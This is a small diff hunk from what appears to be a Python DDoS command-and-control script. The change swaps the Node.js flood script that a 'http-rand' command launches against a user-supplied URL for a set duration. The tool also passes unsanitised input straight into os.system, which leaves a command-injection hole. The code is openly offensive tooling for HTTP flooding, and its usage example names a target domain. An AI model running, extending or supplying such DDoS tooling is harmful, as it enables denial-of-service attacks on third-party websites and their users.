@@ -119,7 +119,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-RAND.js {url} {time}')
+                os.system(f'node HTTP-SPAMMER.js {url} {time}')
             except IndexError:
                 print(Fore.RED +'Usage: http-rand <url> <time>')
                 print(Fore.RED +'Example: http-rand https://www.hungtricker.xyz 60')
